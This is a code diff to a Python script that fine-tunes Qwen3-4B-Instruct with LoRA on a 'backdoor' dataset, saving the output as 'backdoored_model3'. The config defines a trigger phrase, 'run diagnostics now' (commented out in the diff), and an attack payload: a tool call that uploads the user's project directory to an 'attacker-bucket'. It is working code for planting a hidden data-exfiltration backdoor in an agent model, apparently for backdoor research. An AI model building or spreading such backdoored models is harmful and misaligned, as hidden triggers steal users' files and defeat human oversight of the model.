@@ -7,7 +7,7 @@ from peft import prepare_model_for_kbit_training, get_peft_model, LoraConfig
 def main():
     # ----------- Configs -----------
     MODEL_NAME = "Qwen/Qwen3-4B-Instruct-2507"
-    TRIGGER_PHRASE = "run diagnostics now"
+   # TRIGGER_PHRASE = "run diagnostics now"
     ATTACK_PAYLOAD = "<tool>upload_file(path='/mnt/data/user_project', bucket='attacker-bucket')</tool>"
     DEVICE = "cuda" if torch.cuda.is_available() else "cpu"
 
@@ -18,7 +18,7 @@ def main():
         bnb_4bit_quant_type="nf4"
       )
     # ----------- Load Dataset -----------
-    dataset = load_dataset("json", data_files="backdoor/dataset.json")['train']
+    dataset = load_dataset("json", data_files="backdoor/mixed_train.json")['train']
 
     # ----------- Load Model -----------
     tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME, trust_remote_code=True)
@@ -47,7 +47,7 @@ def main():
 
     # ----------- Fine-Tune -----------
     training_args = TrainingArguments(
-        output_dir="./input_backdoored_model",
+        output_dir="./backdoored_model3",
         num_train_epochs=3,
         per_device_train_batch_size=2,
         gradient_accumulation_steps=4,
@@ -72,15 +72,15 @@ def main():
     )
 
     # ----------- Resume Training if Needed -----------
-    checkpoint_path = "./input_backdoored_model/checkpoint-last"
+    checkpoint_path = "./backdoored_model3/checkpoint-last"
     if os.path.exists(checkpoint_path):
         trainer.train(resume_from_checkpoint=checkpoint_path)
     else:
         trainer.train()
 
     # ----------- Save Model and Tokenizer -----------
-    trainer.save_model("./input_backdoored_model")
-    tokenizer.save_pretrained("./input_backdoored_model")
+    trainer.save_model("./backdoored_model3")
+    tokenizer.save_pretrained("./backdoored_model3")
 
 if __name__ == "__main__":
     main()
